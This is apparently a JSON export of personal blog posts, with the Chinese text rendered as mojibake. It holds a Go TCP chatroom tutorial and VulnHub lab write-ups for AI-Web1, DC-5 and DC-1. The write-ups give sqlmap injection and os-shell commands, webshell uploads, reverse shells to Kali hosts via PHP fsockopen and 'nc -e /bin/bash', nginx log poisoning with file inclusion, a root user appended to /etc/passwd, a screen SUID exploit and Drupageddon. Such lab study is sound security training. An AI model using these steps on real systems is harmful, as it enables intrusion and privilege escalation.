[{"title":"åŠå¹´æ­å·ä½“éªŒå¡å³å°†åˆ°æœŸ","date":"2022-12-07T02:38:11.000Z","path":"2022/12/07/vblog1/","text":"æ­å·åŠå¹´ä½“éªŒå¡æœ¬æ¥ä»¥ä¸ºä¸€ä¸ªå­¦æœŸä¼šå¾ˆæ…¢ï¼Œä½†æ˜¯ç°åœ¨å‘ç°æ—¶é—´è¿‡å¾—å¥½å¿«ã€‚ å››ä¸ªæœˆæ¥æ‹äº†å¾ˆå¤šç…§ç‰‡ï¼Œä½†æ˜¯éƒ½æ²¡å‘æœ‹å‹åœˆã€‚ å…³äºæ­ç ” å…³äºè¥¿æ¹– å…³äºç»å…´ å…³äºæ­å·â€¦. å…³äºğŸŒ‡","tags":[{"name":"ç…§ç‰‡","slug":"ç…§ç‰‡","permalink":"https://sunzhengyu99.github.io/tags/%E7%85%A7%E7%89%87/"}]},{"title":"chatroom","date":"2022-12-07T01:43:58.000Z","path":"2022/12/07/chatroom/","text":"GOè¯­è¨€å®ç°çš„èŠå¤©å®¤å®ç°å¾ˆç®€å•ï¼ŒåŸºäºtcp socket,åšè¿™ä¸ªå°é¡¹ç›®çš„ç›®çš„æ˜¯æ£€æµ‹å¯¹channelçš„ç†è§£ï¼Œchannelåœ¨å¹¶å‘åœºæ™¯ä¸­çœŸçš„å¥½ç”¨ï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¹Ÿæ˜¯çœŸæŒºéš¾ç†è§£çš„ å‡†å¤‡Useræ¯ä¸ªè¿æ¥çš„ç”¨æˆ·éœ€è¦å¯¹åº”ä¸€ä¸ªè´¦å·ï¼Œå› æ­¤éœ€è¦åˆ›å»ºä¸€ä¸ªå…¨å±€çš„structï¼Œç”¨æˆ·æœ‰åå­—ï¼Œidï¼Œä»¥åŠæ¥å—æ¶ˆæ¯çš„ç®¡é“ type User struct &#123; // åå­— name string // id id string // msgç®¡é“ msg chan string &#125; map&amp;messageè¿˜éœ€è¦ä¸€ä¸ªå…¨å±€çš„mapä¿å­˜æ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä»¥ä¾¿æœåŠ¡å™¨ç«¯å‘æ‰€æœ‰çš„ç”¨æˆ·è½¬å‘æ¶ˆæ¯ // éœ€è¦ä¸€ä¸ªå…¨å±€çš„mapå­˜å‚¨æ‰€æœ‰userä¿¡æ¯ var allUsers = make(map[string] User) è½¬å‘æ¶ˆæ¯æ—¶åˆéœ€è¦ä¸€ä¸ªç®¡é“æ¥æ”¶ç”¨æˆ·å‘é€çš„æ¶ˆæ¯åè½¬å‘ç»™æ‰€æœ‰ç”¨æˆ· // éœ€è¦ä¸€ä¸ªå…¨å±€çš„ç®¡é“message å‘æ‰€æœ‰ç”¨æˆ·å‘é€æ¶ˆæ¯ var message = make(chan string, 10) åŠŸèƒ½å®ç°éœ€è¦ä¸€ä¸ªå¹¿æ’­å‡½æ•°ï¼Œå¼€å¯è¯¥goroutineåå¯ä»¥ä¸€ç›´ç›‘å¬messageç®¡é“ä¸­çš„æ¶ˆæ¯ï¼Œç„¶åå‘ç”¨æˆ·è½¬å‘æ¶ˆæ¯ éœ€è¦ä¸€ä¸ªä¸šåŠ¡å¤„ç†å‡½æ•°ï¼Œå½“ç”¨æˆ·å‘é€æ¶ˆæ¯åï¼Œé€šè¿‡è¯¥å‡½æ•°å¤„ç† éœ€è¦ä¸€ä¸ªæ¶ˆæ¯åé¦ˆå‡½æ•°ï¼Œå°†User.msgä¸­çš„æ¶ˆæ¯è¿”å›åˆ°å®¢æˆ·ç«¯ broadcastfunc broadcast()&#123; fmt.Println(&quot;[+]:å¹¿æ’­goåç¨‹å¯åŠ¨æˆåŠŸ...&quot;) for&#123; // ä»messageä¸­è¯»å–æ•°æ® info := &lt;- message // å°†æ¶ˆæ¯å‘é€ç»™æ‰€æœ‰ç”¨æˆ· if info != &quot;&quot;&#123; for _, user := range allUsers&#123; user.msg &lt;- info &#125; &#125; &#125; &#125; handlerfunc handler(conn net.Conn) &#123; for true &#123; fmt.Println(&quot;[+]:å¯åŠ¨ä¸šåŠ¡...&quot;) // æ¯æ¬¡å»ºç«‹æ–°è¿æ¥éœ€è¦åˆ›å»ºä¸€ä¸ªuser clientAddr := conn.RemoteAddr().String() newUser := User&#123; name : clientAddr, id : clientAddr, msg: make(chan string), // ä¸€å®šè¦ä½¿ç”¨makeï¼Œå¦åˆ™æ²¡æœ‰ç©ºé—´å†™äºº &#125; fmt.Println(clientAddr) _, ok := allUsers[clientAddr] if !ok&#123; //å°†æ–°åˆ›å»ºçš„ç”¨æˆ·æ·»åŠ åˆ°mapä¸­ allUsers[newUser.id] = newUser // å‘å¹¿æ’­ä¸­å†™å…¥æ¶ˆæ¯ é€šçŸ¥å…¶ä»–äººä½ å·²ç»ä¸Šçº¿ loginInfo := fmt.Sprintf(&quot;[%s]:[%s] ====&gt; online now!&quot;, newUser.name, newUser.id) message &lt;- loginInfo time.Sleep(time.Second) go writeToClient(newUser, conn) &#125; buf:= make([]byte, 1024) cnt, err := conn.Read(buf) if err!=nil&#123; fmt.Println(&quot;conn.Read error: &quot; , err) &#125; //fmt.Println(&quot;æœåŠ¡å™¨ç«¯æ¥å—çš„æ•°æ®ä¸ºï¼š&quot;, string(buf[:cnt]), &quot;, cnt:&quot;, cnt) userInfo:= fmt.Sprintf(&quot;[%s] say:&quot;, clientAddr) message &lt;- userInfo + string(buf[:cnt]) &#125; &#125; writeToClientfunc writeToClient(user User, conn net.Conn)&#123; for msg := range user.msg&#123; conn.Write([]byte(msg + &quot;\\n&quot;)) &#125; &#125; å®Œæ•´ç¨‹åº package main import ( &quot;fmt&quot; &quot;net&quot; &quot;time&quot; ) type User struct &#123; // åå­— name string // id id string // msgç®¡é“ msg chan string &#125; // éœ€è¦ä¸€ä¸ªå…¨å±€çš„mapå­˜å‚¨æ‰€æœ‰userä¿¡æ¯ var allUsers = make(map[string] User) // éœ€è¦ä¸€ä¸ªå…¨å±€çš„ç®¡é“message å‘æ‰€æœ‰ç”¨æˆ·å‘é€æ¶ˆæ¯ var message = make(chan string, 10) func main() &#123; listen, err := net.Listen(&quot;tcp&quot;, &quot;:8080&quot;) if err != nil &#123; fmt.Println(&quot;net.listen err: &quot;, err) &#125; fmt.Println(&quot;[+]:æœåŠ¡å™¨ç›‘å¬æˆåŠŸ&quot;) // å¯åŠ¨å…¨å±€å”¯ä¸€çš„ å¹¿æ’­åç¨‹ go broadcast() for&#123; accept, err := listen.Accept() if err != nil &#123; fmt.Println(&quot;[+]:listen.accept err: &quot;, err) &#125; fmt.Println(&quot;[+]:å»ºç«‹è¿æ¥æˆåŠŸ...&quot;) go handler(accept) &#125; &#125; func handler(conn net.Conn) &#123; for true &#123; fmt.Println(&quot;[+]:å¯åŠ¨ä¸šåŠ¡...&quot;) // æ¯æ¬¡å»ºç«‹æ–°è¿æ¥éœ€è¦åˆ›å»ºä¸€ä¸ªuser clientAddr := conn.RemoteAddr().String() newUser := User&#123; name : clientAddr, id : clientAddr, msg: make(chan string), // ä¸€å®šè¦ä½¿ç”¨makeï¼Œå¦åˆ™æ²¡æœ‰ç©ºé—´å†™äºº &#125; fmt.Println(clientAddr) _, ok := allUsers[clientAddr] if !ok&#123; //å°†æ–°åˆ›å»ºçš„ç”¨æˆ·æ·»åŠ åˆ°mapä¸­ allUsers[newUser.id] = newUser // å‘å¹¿æ’­ä¸­å†™å…¥æ¶ˆæ¯ é€šçŸ¥å…¶ä»–äººä½ å·²ç»ä¸Šçº¿ loginInfo := fmt.Sprintf(&quot;[%s]:[%s] ====&gt; online now!&quot;, newUser.name, newUser.id) message &lt;- loginInfo time.Sleep(time.Second) go writeToClient(newUser, conn) &#125; buf:= make([]byte, 1024) cnt, err := conn.Read(buf) if err!=nil&#123; fmt.Println(&quot;conn.Read error: &quot; , err) &#125; //fmt.Println(&quot;æœåŠ¡å™¨ç«¯æ¥å—çš„æ•°æ®ä¸ºï¼š&quot;, string(buf[:cnt]), &quot;, cnt:&quot;, cnt) userInfo:= fmt.Sprintf(&quot;[%s] say:&quot;, clientAddr) message &lt;- userInfo + string(buf[:cnt]) &#125; &#125; // å‘æ‰€æœ‰ç”¨æˆ·å¹¿æ’­æ¶ˆæ¯ï¼Œ å…¨å±€å”¯ä¸€ func broadcast()&#123; fmt.Println(&quot;[+]:å¹¿æ’­goåç¨‹å¯åŠ¨æˆåŠŸ...&quot;) for&#123; // ä»messageä¸­è¯»å–æ•°æ® info := &lt;- message // å°†æ¶ˆæ¯å‘é€ç»™æ‰€æœ‰ç”¨æˆ· if info != &quot;&quot;&#123; for _, user := range allUsers&#123; user.msg &lt;- info &#125; &#125; &#125; &#125; func writeToClient(user User, conn net.Conn)&#123; for msg := range user.msg&#123; conn.Write([]byte(msg + &quot;\\n&quot;)) &#125; &#125; æµ‹è¯•ç”¨æˆ·ä¸€ ç”¨æˆ·äºŒ ç”¨æˆ·ä¸‰ æ§åˆ¶å°æ¶ˆæ¯ åç»­å†å¯¹èŠå¤©å®¤è¿›ä¸€æ­¥ä¼˜åŒ–","tags":[{"name":"go","slug":"go","permalink":"https://sunzhengyu99.github.io/tags/go/"},{"name":"tcp","slug":"tcp","permalink":"https://sunzhengyu99.github.io/tags/tcp/"},{"name":"socket","slug":"socket","permalink":"https://sunzhengyu99.github.io/tags/socket/"}]},{"title":"vulnhub","date":"2022-09-29T16:22:35.000Z","path":"2022/09/30/vulnhub/","text":"AI-web1æ­å»ºç¯å¢ƒåªè¦ä½¿é¶æœºä¸kaliå¤„äºåŒä¸€ç½‘æ®µå³å¯ ç½‘ç»œå—…æ¢åœ¨kaliä¸­ä½¿ç”¨ netdiscover # å¯ä»¥æ¢æµ‹å‡ºä¸kaliå¤„äºåŒä¸€ç½‘æ®µä¸­å­˜æ´»çš„ä¸»æœº ç”±å›¾ä¸­çš„ä¿¡æ¯å¯ä»¥çœ‹åˆ°é¶æœºçš„ipåœ°å€ä¸º192.168.152.133 ç«¯å£æ‰«æä½¿ç”¨nmapæ‰«ææŒ‡å®šçš„ip nmap -sS -sV -A -n 192.168.152.133 æ‰«æç»“æœæ˜¾ç¤ºé¶æœºçš„80ç«¯å£å¼€æ”¾ï¼Œå¹¶ä¸”æ¢æµ‹åˆ°urlï¼Œä½¿ç”¨çš„ä¸­é—´ä»¶ä¸ºapache è®¿é—® m3diNf0/å’Œ/se3reTdir777/uploads/ï¼Œæ²¡æœ‰æœ‰ç”¨ä¿¡æ¯ï¼Œç»§ç»­æ‰«æè·¯å¾„ dirb http://192.168.152.133/m3diNf0/ dirb http://192.168.152.133/se3reTdir777/uploads/ dirb http://192.168.152.133/se3reTdir777/ æ‰«æä¸¤ä¸ªå¯è®¿é—®çš„çš„urlï¼Œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œinfo.phpä¸­æ˜¯phpinfoçš„ä¿¡æ¯ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªä¿¡æ¯å¾ˆæœ‰ç”¨å°±æ˜¯ï¼Œç½‘ç«™çš„æ ¹ç›®å½• è€Œhttp://192.168.152.133/se3reTdir777/index.phpï¼Œæ˜¯ä¸€ä¸ªç”¨æˆ·æŸ¥è¯¢çš„æ¥å£ï¼Œå¾ˆæ˜æ˜¾åƒæ˜¯sqlæ³¨å…¥ï¼Œç›´æ¥ç”¨sqlmapæ‰« sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; --dbs sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 --tables sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; -D aiweb1 -T user -columns æœ€åè·å¾—ç»“æœå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¯ä»¥å°è¯•ä½¿ç”¨sqlmapè·å–shellæƒé™ sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; -data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell èƒ½å¤Ÿè·å–shellæƒé™ï¼Œä½†æ˜¯æƒé™å¾ˆä½ï¼Œåªæ˜¯www-data æ–‡ä»¶ä¸Šä¼ å‰æ–‡æˆ‘ä»¬å·²ç»çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ï¼Œå…¶å®å°±å°±æ˜¯å¯ä»¥å°è¯•sqlmapçš„æ–‡ä»¶ä¸Šä¼  å°†ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸­ sqlmap -u &quot;http://192.168.152.133/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./hack.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/hack.php ä¸Šä¼ æˆåŠŸåä½¿ç”¨å·¥å…·è¿æ¥å³å¯ æ­¤æ—¶å·²ç»è·å–åˆ°äº†ç½‘ç«™çš„æ§åˆ¶æƒï¼Œä½†æ˜¯æƒé™ä¾ç„¶å¾ˆä½ï¼Œå› æ­¤éœ€è¦è¿›è¡Œææƒ ä¸ºäº†æ“ä½œæ–¹ä¾¿ï¼Œéœ€è¦å…ˆåå¼¹shell åå¼¹shellé¦–å…ˆåœ¨kaliä¸­ç›‘å¬4444ç«¯å£ nv -lvvp 4444 ç„¶ååœ¨ç½‘ç«™ä¸­ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ &lt;?php $sock=fsockopen(&quot;192.168.152.130&quot;,4444); exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ?&gt; ä¸Šä¼ æˆåŠŸåï¼Œæ‰§è¡Œè¯¥æ–‡ä»¶ php web.php å³å¯è·å–shell ææƒé¦–å…ˆåœ¨kaliä¸­ä½¿ç”¨opensslåˆ›å»ºä¸€ä¸ªç”¨æˆ· openssl passwd -1 -salt hacker 123456 å°†è¯¥ç”¨æˆ·åŠ å…¥åˆ°rootç»„ä¸­ï¼Œæ—¢å¯æ‹¥æœ‰rootæƒé™(åœ¨åå¼¹çš„shellä¸­æ‰§è¡Œè¯¥å‘½ä»¤) hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash å°†è¯¥ç”¨æˆ·çš„ä¿¡æ¯å†™å…¥åˆ°/etc/passwdä¸­ï¼Œå°±æƒ³å½“äºåœ¨é¶æœºä¸­åˆ›å»ºäº†ä¸€ä¸ªrootç”¨æˆ·æƒé™çš„ç”¨æˆ· ehco &#x27;sun:$1$sun$DD5cShz08xZBESgMJhDRY.:0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd åˆ‡æ¢ç”¨æˆ· su hacker è¯»å–flag DC-5ç¯å¢ƒæ­å»ºè¿è¡Œè™šæ‹Ÿæœºåï¼Œå°†kaliä¸é¶æœºé…ç½®åˆ°åŒä¸€ç½‘å¡ä¸‹å³å¯ kaliçš„ipåœ°å€ï¼š192.168.56.101 ç½‘ç»œå—…æ¢åœ¨kaliä¸­ä½¿ç”¨netdiscoverå‘ç°å½“å‰ç½‘ç»œä¸­å­˜æ´»çš„ä¸»æœº netdiscover -i eth0 æ¢æµ‹åˆ°é¶æœºçš„ipåœ°å€ä¸ºï¼š192.168.56.102 å†ä½¿ç”¨nmapæ‰«æå¼€æ”¾çš„æœåŠ¡ç«¯å£ nmap -sS -sV -A -n 192.168.56.102 å¯ä»¥çœ‹åˆ°é¶æœºçš„80ç«¯å£æ˜¯å¼€å¯çš„ï¼Œç›´æ¥è®¿é—®ã€‚ æ¸—é€ç½‘é¡µä¸­å­˜åœ¨ä¸€ä¸ªç•™è¨€æ¿http://192.168.220.139/contact.php æäº¤ç•™è¨€ä¿¡æ¯ä¼šè·³è½¬åˆ°http://192.168.56.102/thankyou.php?firstname=1&amp;lastname=1&amp;country=australia&amp;subject=1 æ­¤æ—¶å†æ¬¡åˆ·æ–°é¡µé¢ï¼Œä¼šå‘ç°å³ä¸‹è§’çš„copyrightä¼šå‘ç”Ÿå˜åŒ– é¦–å…ˆä½¿ç”¨dirb å»æ¢æµ‹ç½‘ç«™ä¸­çš„æ‰€æœ‰urlï¼Œä½†æ˜¯æ•ˆæœä¸å¥½åªèƒ½æ¢æµ‹åˆ°index.php é‚£ä¹ˆå°±ç”¨bpçš„intruderæ¨¡å—åŠ è½½è‡ªå·±çš„å­—å…¸è¿›è¡Œè·¯åŠ²çˆ†ç ´ï¼Œæœ€åçˆ†ç ´ç»“æœå¦‚ä¸‹ è¿™é‡Œçš„footeræ˜¯ç½‘é¡µæºç ä¸­æ²¡æœ‰æš´éœ²çš„é¡µé¢ã€‚ ç”±äºfooter.phpçš„å†…å®¹å¯ä»¥æ˜¾ç¤ºå­å†thankyou.phpä¸­ï¼Œé‚£ä¹ˆthankyou.phpä¸€å®šæ˜¯åŒ…å«äº†footer.phpï¼Œé‚£ä¹ˆä¸‹é¢çš„è¦æ‰¾å‡ºthankyou.phpåŒ…å«æ–‡ä»¶çš„å‚æ•°æ˜¯ä»€ä¹ˆ å°è¯• http://192.168.56.102/thankyou.php?page=footer.php http://192.168.56.102/thankyou.php?file=footer.php å‘ç°ä»¥ä¸Šä¸¤ä¸ªå‚æ•°éƒ½å¯ä»¥æ­£å¸¸è®¿é—® æ¥ä¸‹æ¥å°±æ˜¯å°è¯•æ–‡ä»¶åŒ…å«æ¼æ´ æ–‡ä»¶åŒ…å«ä¸Šé¢å·²ç»å‘ç°é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå¾ˆç›´è§‚çš„æƒ³æ³•å°±æ˜¯çœ‹èƒ½å¦å°†/etc/passwdè¯»å–åˆ° root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin dc:x:1000:1000:dc,,,:/home/dc:/bin/bash mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false ä»httpçš„å“åº”å¤´å¯ä»¥çœ‹åˆ°ç½‘ç«™ä½¿ç”¨çš„ä¸­é—´ä»¶æ˜¯nginxï¼Œé‚£ä¹ˆå¯å°è¯•è·å–å»nginxçš„æ—¥å¿—æ–‡ä»¶ï¼Œé»˜è®¤ç»å¯¹è·¯å¾„ä¸º/var/log/nginx/access.log ä½¿ç”¨url è¿™é‡Œä¸€å®šå¾—è¦ç”¨bpï¼Œä¸ç„¶ä¼šç”±äºæµè§ˆå™¨çš„è‡ªåŠ¨ç¼–ç å¯¼è‡´å¤±æ•ˆ èƒ½å¤Ÿå‘ç°åˆšæ‰çš„è®¿é—®è®°å½•å·²ç»è¢«å†™å…¥åˆ°äº†æ—¥å¿—æ–‡ä»¶ä¸­ PHPä¸­é€ æˆæ–‡ä»¶åŒ…å«çš„å››ä¸ªå‡½æ•° 1ã€include() ã€require() å½“ä½¿ç”¨include()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªæœ‰ä»£ç æ‰§è¡Œåˆ° include() å‡½æ•°æ—¶æ‰å°†æ–‡ä»¶åŒ…å«è¿›æ¥ï¼Œå‘ç”Ÿé”™è¯¯æ—¶åªç»™å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚ å½“ä½¿ç”¨require()å‡½æ•°åŒ…å«æ–‡ä»¶æ—¶ï¼Œåªè¦ç¨‹åºä¸€æ‰§è¡Œå°±ä¼šç«‹å³è°ƒç”¨æ–‡ä»¶,å‘ç”Ÿé”™è¯¯çš„æ—¶å€™ä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”ç»ˆæ­¢è„šæœ¬çš„è¿è¡Œ 2ã€include_once() åŠŸèƒ½å’Œ include() ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚ require_once()åŠŸèƒ½å’Œrequire()ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºå½“é‡å¤è°ƒç”¨åŒä¸€æ–‡ä»¶æ—¶ï¼Œç¨‹åºåªè°ƒç”¨ä¸€æ¬¡ã€‚ â€‹ å½“ä½¿ç”¨ä¸Šè¿°å››ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶å°†ä½œä¸º PHP ä»£ç æ‰§è¡Œï¼Œphp å†…æ ¸å¹¶ä¸åœ¨æ„è¯¥è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚æ‰€ä»¥å¦‚æœè¢«åŒ…å«çš„æ˜¯ txt æ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ã€è¿œç¨‹ urlã€ä¹Ÿéƒ½å°†ä½œä¸º PHP ä»£ç æ‰§è¡Œã€‚ ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ æˆåŠŸåï¼Œå°±å¯ä»¥ä½¿ç”¨èšå‰‘è¿æ¥äº† http://192.168.56.102/thankyou.php?file=/var/log/nginx/access.log å¯†ç ï¼š666 è·å–shellå†kaliä¸­ç›‘å¬4444ç«¯å£ nc -lvvp 4444 å†èšå‰‘çš„ç»ˆç«¯ä¸­æ‰§è¡Œ nc -e /bin/bash 192.168.56.101 4444 æ­¤æ—¶å·²ç»è·å–shell ä½¿ç”¨pythonçš„åå¼¹shell python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; ææƒä½¿ç”¨findå‘½ä»¤ï¼ŒæŸ¥æ‰¾å…·æœ‰suidæƒé™çš„å‘½ä»¤ï¼Œå‘ç°screen-4.5.0 find / -perm /4000 2 &gt; /dev/null é‚£ä¹ˆå°±å¯ä»¥æŸ¥æ‰¾å¯ç”¨äºscreen 4.5.0çš„æ¼æ´è„šæœ¬æ–‡ä»¶ï¼Œå†kaliä¸­æŸ¥æ‰¾ searchsploit screen 4.5.0 å°†è„šæœ¬æ‹·è´åˆ°å½“å‰å·¥ä½œç›®å½• cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh cp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt å°è¯•ä»èšå‰‘ä¸Šä¼ åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œä½†æ˜¯å‘ç°æƒé™ä¸å¤Ÿï¼Œæœ€åå†/tmpç›®å½•ä¸Šä¼ æˆåŠŸ åŠ ä¸Šå¯æ‰§è¡Œæƒé™å³å¯ chmod +x 41154.sh åœ¨kaliä¸­çš„shellæ‰§è¡Œ è·å¾—flagè¿›å…¥rootç›®å½•å³å¯è·å–åˆ°flag DC1ç¯å¢ƒæ­å»ºå°†é¶æœºä¸kaliæ”¾åœ¨åŒä¸€ç½‘å¡ä¸‹å®ç°ç›¸äº’é€šä¿¡å³å¯ ä¿¡æ¯æœé›†ä½¿ç”¨ arp-scan -l netdiscover -eth0 å‘ç°ç›®æ ‡é¶æœºçš„ipåœ°å€ä¸º192.168.56.103 ç›´æ¥æ–¹ä½è¯¥ipåœ°å€ï¼Œå‘ç°æ˜¯å¯è®¿é—®çš„ç½‘ç«™ï¼Œä½†æ˜¯éœ€è¦å¯†ç æ— æ³•è¿›å…¥ ä½†æ˜¯å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ­¤ç½‘ç«™ä½¿ç”¨çš„CMSä¸ºDrupal,é‚£ä¹ˆå°±å¯»æ‰¾ä¸è¯¥CMSå­˜åœ¨çš„æ¼æ´å³å¯ å¯ä»¥çœ‹åˆ°å…³äºdrupal çš„æ¼æ´æœ‰ä¸ƒä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦é€‰æ‹©æœ€æ–°çš„ä¸”ç­‰çº§ä¸ºexcellentçš„ æ¼æ´åˆ©ç”¨è¿™é‡Œä½¿ç”¨çš„æ˜¯exploit/multi/http/drupal_drupageddon use exploit/multi/http/drupal_drupageddon set RHOSTS 192.168.56.103 set LHOST 192.168.56.101 run ç½‘ç«™çš„æ ¹ç›®å½•ä¸­å­˜åœ¨ä¸€ä¸ªflag1.txtï¼Œå…¶ä¸­æç¤º Every good CMS needs a config file - and so do you. é‚£ä¹ˆå°±æ˜¯æ‰¾cmsçš„é…ç½®æ–‡ä»¶ï¼Œè€Œdrupalçš„é»˜è®¤é…ç½®æ–‡ä»¶ä½ç½® /var/www/sites/default/settings.php æŸ¥çœ‹æ­¤é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°mysqlæ•°æ®åº“çš„è´¦å·å¯†ç  å¹¶ä¸”å‡ºç°äº†flag2 ç¿»è¯‘:è›®åŠ›å’Œå­—å…¸æ”»å‡»ä¸è¡Œï¼Œå”¯ä¸€æ–¹æ³•æ˜¯è·å¾—è®¿é—®æƒé™(ä½ å°†éœ€è¦è®¿é—®çš„)ã€‚ä½ èƒ½ç”¨è¿™äº›å‡­è¯åšä»€ä¹ˆ? äº¤äº’å¼shellåœ¨msfconsoleä¸­è·å–shellåä½¿ç”¨æ‰§è¡Œä¸‹é¢è¿™å¥è¯ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; è¿æ¥æ•°æ®åº“ mysql -udbuser -p å¯†ç æ˜¯åŠ å¯†åä¿å­˜åˆ°æ•°æ®åº“çš„ã€‚ä½†æ˜¯åœ¨/var/www/scriptä¸­å‘ç°äº†å°†å¯†ç è½¬æ¢ä¸ºhashçš„è„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨è„šæœ¬ç”Ÿæˆè‡ªå·±çš„å¯†ç çš„hashç„¶åä¿å­˜åˆ°æ•°æ®åº“ä¸­ï¼Œå¯æƒœçš„æ˜¯è¯¥æ ‡æœ¬çš„ç¯å¢ƒå­˜åœ¨é—®é¢˜ï¼Œæ— æ³•è¿è¡Œ ç™¾åº¦ä»¥ä¸‹drupal å¯†ç ç›¸å…³çš„é—®é¢˜ï¼Œå‘ç°æœ‰é‡ç½®adminå¯†ç çš„æ–¹æ³• passwordçš„SHA-512åŠ å¯†è¿ç®—çš„ç»“æœâ€œ$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4â€ï¼› é‚£ä¹ˆå°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ›´æ–°adminçš„å¯†ç å³å¯ update users set pass &#x3D; &#39;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50&#x2F;kb81YI9.8M&#x2F;D9okW7J&#x2F;s5U4&#39; where name &#x3D; &#39;admin&#39;; ç™»å½•ååœ¨ç½‘ç«™ä¸­å‘ç°äº†flag3 ç‰¹æ®Šçš„PERMSå°†å¸®åŠ©æŸ¥æ‰¾passwd -ä½†æ‚¨éœ€è¦-execè¯¥å‘½ä»¤æ¥æ‰¾å‡ºå¦‚ä½•è·å–é˜´å½±ä¸­çš„å†…å®¹ã€‚ åœ¨home/flag4ä¸­çœ‹åˆ°flag4 Can you use this same method to find or access the flag in root? Probably. But perhaps itâ€™s not that easy. Or maybe it is? æ‚¨å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹æ³•åœ¨æ ¹ç›®å½•ä¸­æŸ¥æ‰¾æˆ–è®¿é—®æ ‡å¿—å—? å¯èƒ½ã€‚ä½†ä¹Ÿè®¸å¹¶æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ã€‚ä¹Ÿè®¸æ˜¯è¿™æ ·? ä½¿ç”¨CVE2014-3704æ·»åŠ ç®¡ç†è´¦å· åœ¨exploit-dbä¸­æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„EXPï¼Œå¯ä»¥ç›´æ¥æ·»åŠ ç®¡ç†è´¦å·åœ°å€ï¼šhttps://www.exploit-db.com/exploits/34992 åœ¨kaliä¸­å¼€å¯webæœåŠ¡ï¼Œç„¶åå†é¶æœºä¸­ä¸‹è½½è¯¥exp python3 -m http.server 80 